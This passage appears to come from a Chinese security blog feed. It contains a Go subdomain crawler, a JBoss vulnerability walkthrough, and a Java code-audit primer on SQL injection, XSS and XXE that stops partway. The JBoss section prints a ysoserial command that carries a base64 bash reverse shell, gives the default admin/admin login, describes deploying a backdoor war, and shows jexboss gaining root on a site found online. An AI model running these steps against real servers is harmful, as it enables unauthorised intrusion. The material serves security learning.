<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">crawl</span><span class="params">(uri <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	fmt.Println(uri)</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span>&#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">	resp, err1 := http.Get(uri)</span><br><span class="line">	<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Print(err1)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	links := collectlinks.All(resp.Body)</span><br><span class="line">	resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, link := <span class="keyword">range</span> links &#123;</span><br><span class="line">		urls,err:=url.Parse(link)</span><br><span class="line">		<span class="keyword">if</span> err!=<span class="literal">nil</span> &#123;</span><br><span class="line">			log.Println(err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> isSubdomain(urls.Host,<span class="string">"jd.com"</span>)&#123;</span><br><span class="line">			sublists=<span class="built_in">append</span>(sublists,<span class="string">"http://"</span>+urls.Host)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	sublists=remove(sublists)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sublists</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sublists:=<span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">	seen:=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line">	sublists = <span class="built_in">append</span>(sublists,<span class="string">"https://www.jd.com"</span>)</span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(sublists) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		items := sublists</span><br><span class="line">		sublists = <span class="literal">nil</span></span><br><span class="line">		<span class="keyword">for</span> _, item := <span class="keyword">range</span> items &#123;</span><br><span class="line">			<span class="keyword">if</span> !seen[item] &#123;</span><br><span class="line">				seen[item] = <span class="literal">true</span></span><br><span class="line">				sublists=<span class="built_in">append</span>(sublists,crawl(item)...)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubdomain</span><span class="params">(rawURL, domain <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	reg,err:=regexp.MatchString(domain,rawURL)</span><br><span class="line">	<span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">		log.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> reg&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(languages []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	result := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(languages))</span><br><span class="line">	temp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> _, item := <span class="keyword">range</span> languages &#123;</span><br><span class="line">		<span class="keyword">if</span> _, ok := temp[item]; !ok &#123;</span><br><span class="line">			temp[item] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">			result = <span class="built_in">append</span>(result, item)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h4><p>最后一步我们来实现并发功能：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"net/url"</span></span><br><span class="line">	<span class="string">"regexp"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	worklist := <span class="built_in">make</span>(<span class="keyword">chan</span> []<span class="keyword">string</span>)</span><br><span class="line">	sublists := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">	seen := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line">	sublists = <span class="built_in">append</span>(sublists, <span class="string">"https://www.jd.com"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; worklist &lt;- sublists &#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> list := <span class="keyword">range</span> worklist &#123;</span><br><span class="line">		<span class="keyword">for</span> _, link := <span class="keyword">range</span> list &#123;</span><br><span class="line">			<span class="keyword">if</span> !seen[link] &#123;</span><br><span class="line">				seen[link] = <span class="literal">true</span></span><br><span class="line">				<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(link <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">					worklist &lt;- crawl(link)</span><br><span class="line">				&#125;(link)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Step6"><a href="#Step6" class="headerlink" title="Step6"></a>Step6</h4><p>最后在主函数使用flag包获取命令行参数，传入函数执行即可。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">flag.<span class="constructor">StringVar(&amp;<span class="params">ur1</span>, <span class="string">"u"</span>,<span class="string">""</span>,<span class="string">"待爬url,如http://www.jd.com"</span>)</span></span><br><span class="line">flag.<span class="constructor">StringVar(&amp;<span class="params">domain</span>, <span class="string">"s"</span>,<span class="string">""</span>,<span class="string">"域名,如jd.com"</span>)</span></span><br><span class="line">flag.<span class="constructor">Parse()</span></span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>完整代码:<a href="https://github.com/Shu1L/go_jsspider" target="_blank" rel="noopener">Shu1L/go_jsspider: 用go编写的简单爬取页面js的脚本 (github.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>jBoss中间件漏洞</title>
    <url>/2020/04/03/jboss-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="jBoss中间件漏洞复现"><a href="#jBoss中间件漏洞复现" class="headerlink" title="jBoss中间件漏洞复现"></a>jBoss中间件漏洞复现</h2><h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<h4 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h4><p>这里直接复制了官方文档复现：<a href="https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149</a></p>
<p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
<p>参考：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
</ul>
<h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><p>运行测试环境</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure>

<p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/1.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/1.png" alt="img"></a></p>
<p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p>
<p><strong>编写反弹shell的命令</strong></p>
<p>我们使用bash来反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p>
<p>工具：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/2.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/2.png" alt="img"></a></p>
<p><strong>序列化数据生成</strong></p>
<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>ysoserial.<span class="keyword">jar </span>CommonsCollections5 <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p><strong>发送POC</strong></p>
<p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/3.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/3.png" alt="img"></a></p>
<p>成功反弹shell：</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/4.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/4.png" alt="img"></a></p>
<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p>网上已经有很多EXP了，比如<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a></p>
<h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3 漏洞修复"></a>3 漏洞修复</h5><p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p>
<p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
<p>2）用于对 httpinvoker 组件进行访问控制。</p>
<h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
<p><strong>弱口令/未授权访问：</strong></p>
<p>admin/admin</p>
<p><strong>2、 漏洞复现</strong></p>
<p><a href="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png!small" alt="img"></a></p>
<p>点击Web Application(war)s。</p>
<p><a href="https://image.3001.net/images/20181216/1544955283_5c16259340980.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955283_5c16259340980.png!small" alt="img"></a></p>
<p>点击add a new resource。</p>
<p><a href="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png!small" alt="img"></a></p>
<p>选择一个war包上传，上传后，进入该war包，点击start。</p>
<p><a href="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png!small" alt="img"></a></p>
<p>查看status为sucessful。</p>
<p><a href="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png!small" alt="img"></a></p>
<p>访问该war包页面，进入后门。</p>
<p>可进行文件管理和系统命令执行。</p>
<p><a href="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png!small" alt="img"></a></p>
<h3 id="使用kali复现"><a href="#使用kali复现" class="headerlink" title="使用kali复现"></a>使用kali复现</h3><p>参考链接：<a href="https://blog.csdn.net/u011215939/article/details/79141624" target="_blank" rel="noopener">https://blog.csdn.net/u011215939/article/details/79141624</a></p>
<p>所需工具：kallinux，jexboss，</p>
<p>获取工具：打开kalilinux，在kali终端中输入以下命令：</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTA4OTMxLTc1MzA2MTk4My5wbmc=.jpg" alt="img"></p>
<p>下载完成</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTAzNTExLTEwNzkzNTY3MDgucG5n.jpg" alt="img"></p>
<p>运行 python jexboss.py</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTQ5MzQ5LTE3NjgzMDY3ODYucG5n.jpg" alt="img"></p>
<p>检验是否能够执行，可以执行就是如下：</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTU5OTYwLTE2OTMyNzM0OTEucG5n.jpg" alt="img"></p>
<p>找一个jboos的网站，如图所示</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjA2Mjg0LTE1MzU0ODQxNTQucG5n.jpg" alt="img"></p>
<p>将这个IP:8080复制到kalilinux中使用jexboss工具进行检测；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQxMzA5LTE5MDI1MDExMzQucG5n.jpg" alt="img"></p>
<p>执行,工具会依次检测一下项目，有漏洞就会显示红色的：VULNERABLE(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQ5Njg0LTExNTA3Njc2MTcucG5n.jpg" alt="img"></p>
<p>然后选择yes，开始创建连接；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjU3MTAwLTc0Nzg5ODU1Ni5wbmc=.jpg" alt="img"></p>
<p>返回信息显示连接成功了；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzA0NzI2LTQ5ODI4NTQ5My5wbmc=.jpg" alt="img"></p>
<p>现在获取了shell，开始执行shell命令了；返回的信息显示，这是一个linux操作系统；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzEzMzI0LTIwNzE4NzEyOTgucG5n.jpg" alt="img"></p>
<p>执行几条命令看看； root权限</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzIxMzA2LTUzNzY3MDMxMy5wbmc=.jpg" alt="img"></p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p>
<p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p>
<p><a href="https://www.freebuf.com/articles/web/192063.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192063.html</a></p>
]]></content>
      <categories>
        <category>中间件漏洞学习</category>
      </categories>
      <tags>
        <tag>JBoss中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>java代码审计之常见漏洞学习</title>
    <url>/2021/06/18/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</url>
    <content><![CDATA[<p>title: java代码审计之常见漏洞学习<br>abbrlink: 15301<br>date: 2021-01-27 14:28:28<br>tags:</p>
<h2 id="java代码审计之常见漏洞学习"><a href="#java代码审计之常见漏洞学习" class="headerlink" title="java代码审计之常见漏洞学习"></a>java代码审计之常见漏洞学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Java代码审计中常见的一些漏洞学习总结以及一些审计思路。</p>
<h4 id="java项目分层"><a href="#java项目分层" class="headerlink" title="java项目分层"></a>java项目分层</h4><ul>
<li>视图层(View 视图)</li>
<li>控制层（Controller、Action控制层)</li>
<li>服务层(Service)</li>
<li>业务逻辑层BO(business object)</li>
<li>实体层(entity 实体对象、VO(value)object)值对象、模型层(bean)</li>
</ul>
<h5 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h5><ul>
<li>Servlet是在Java Web容器上运行的小程序</li>
<li>Servlet3.0之前的版本都需要在web.xml中配置</li>
<li>Spring MVC框架就是基于Servlet技术实现的</li>
</ul>
<h4 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h4><h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><p>本质是将用户的输入当做代码执行，程序将用户的输入拼接到了sql语句中，改变原来sql语句的语义造成攻击。</p>
<p><strong>常见的一些例子</strong></p>
<p>DAO: 存在拼接的SQL语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">String sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">"+id</span></span><br></pre></td></tr></table></figure>

<p>Hibernate框架</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">session.createQuery(<span class="string">"from Book where title like '%"</span> + userInput + <span class="string">"%' and pu</span></span><br><span class="line">blished = true<span class="string">")</span></span><br></pre></td></tr></table></figure>

<p>Mybatis框架</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="keyword">like</span> ‘%$&#123;title&#125;%’</span><br><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> ($&#123;<span class="keyword">id</span>&#125;)，</span><br><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title =‘<span class="keyword">java</span>’ <span class="keyword">order</span> <span class="keyword">by</span> $&#123;<span class="built_in">time</span>&#125; <span class="keyword">asc</span></span><br></pre></td></tr></table></figure>

<h5 id="审计方法"><a href="#审计方法" class="headerlink" title="审计方法"></a>审计方法</h5><p>​    对于sql注入来讲，只要是与数据库存在交互的地方，应用程序对用户的输入没有进行有效的过滤，都有可能存在SQL注入漏洞。</p>
<p>在实际环境中<strong>，中间件漏洞的sql注入漏洞可能更多：</strong></p>
<ul>
<li>Mybatis框架中的like、in和order by语句。</li>
<li>Hibernate框架中的createQuery()函数</li>
</ul>
<p>快速定位相关sql语句上下文，查看是否有显式过滤机制。</p>
<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><ul>
<li><p>参数化查询，使用java.sql.PreparedStatement来对数据库发起参数化查询。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">stmt=conncetion.prepare<span class="constructor">Statement(<span class="params">sqlString</span>)</span>;</span><br><span class="line">				stmt.set<span class="constructor">String(1,<span class="params">userName</span>)</span>;</span><br><span class="line">				stmt.set<span class="constructor">String(2,<span class="params">itemName</span>)</span>;</span><br><span class="line">				rs=stmt.execute<span class="constructor">Query()</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用预编译能够预防绝大多数SQL注入，<strong>java.sql.PreparedStatement代替java.sql.Statement</strong>,但对于order by后的不能用预编译进行处理，只能手动过滤。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">String sqlString = "select * from db<span class="emphasis">_user where username=? and password=?";</span></span><br><span class="line"><span class="emphasis">        PreparedStatement stmt = connection.prepareStatement(sqlString);</span></span><br><span class="line"><span class="emphasis">        stmt.setString(1, username);</span></span><br><span class="line"><span class="emphasis">        stmt.setString(2, pwd);</span></span><br><span class="line"><span class="emphasis">        ResultSet rs = stmt.executeQuery();</span></span><br><span class="line"><span class="emphasis">......</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Mybatis的SQL配置中，采用<code>#</code>变量名称</p>
</li>
</ul>
<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h5><p>网站与后端交互的输入输出没有做好过滤，导致攻击者可以插入恶意js语句进行攻击。根据后端代码不同 ，大致可以分为反射型、存储型、DOM型</p>
<p>举例:</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/xss"</span>)</span><br><span class="line"><span class="keyword">public</span> ModelAndView xss(HttpServletRequest request,HttpServletResponse</span><br><span class="line">response) <span class="keyword">throws</span> ServletException,IOException&#123;</span><br><span class="line"> String name = request.getParameter(<span class="string">"name"</span>);</span><br><span class="line"> ModelAndView mav = <span class="keyword">new</span> ModelAndView(<span class="string">"mmc"</span>);</span><br><span class="line"> mav.getModel().put(<span class="string">"uname"</span>, name);</span><br><span class="line"> <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里接收了用户输入的参数name，然后又直接输出到了页面，整个过程没有任何过滤，</p>
<p><strong>存储型</strong></p>
<p>根据已知的用户ID查询该用户的数据并显示在JSP页面上。如果存入的数据存在未经过滤的恶意js代码。就会造成xss攻击。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;%  <span class="built_in">..</span>.</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">"select * from users where id ="</span> + id);</span><br><span class="line">    String<span class="built_in"> address </span>= <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (rs != <span class="literal">null</span>) &#123;</span><br><span class="line">        rs.next();</span><br><span class="line">       <span class="built_in"> address </span>= rs.getString(<span class="string">"address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="审计方法-1"><a href="#审计方法-1" class="headerlink" title="审计方法"></a>审计方法</h5><p>全局搜索用户的输入与输出，查找是否存在过滤。</p>
<h5 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h5><ul>
<li>配置全局过滤器web.xml</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">filter</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;XssSafe&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;XssFilter&lt;/<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;  </span><br><span class="line">    &lt;/<span class="keyword">filter</span>&gt;  </span><br><span class="line">    &lt;<span class="keyword">filter</span>-<span class="keyword">mapping</span>&gt;  </span><br><span class="line">        &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;XssSafe&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;  </span><br><span class="line">        &lt;url-pattern&gt;<span class="comment">/*&lt;/url-pattern&gt;  </span></span><br><span class="line"><span class="comment">    &lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用commons.lang包，主要提供了字符串查找、替换、分割、去空白、去掉非法字符等等操作。有几个函数可以用来过滤。</p>
<ul>
<li>StringEscapeUtils.escapeHtml(string)，使用HTML实体，转义字符串中的字符。</li>
<li>StringEscapeUtils.escapeJavaScript(string)，使用JavaScript字符串规则转义字符串中的字符。</li>
</ul>
</li>
</ul>
<h4 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h4><h5 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h5><p>XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
<h5 id="审计方法-2"><a href="#审计方法-2" class="headerlink" title="审计方法"></a>审计方法</h5><p>XML解析一般在导入配置、数据传输接口等场景会用到，xml解析器是否禁用外部实体。</p>
<p>全局搜索如下函数:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.DocumentBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.stream</span><span class="selector-class">.XMLStreamReader</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jdom2</span><span class="selector-class">.input</span><span class="selector-class">.SAXBuilder</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.parsers</span><span class="selector-class">.SAXParser</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.dom4j</span><span class="selector-class">.io</span><span class="selector-class">.SAXReader</span> </span><br><span class="line"><span 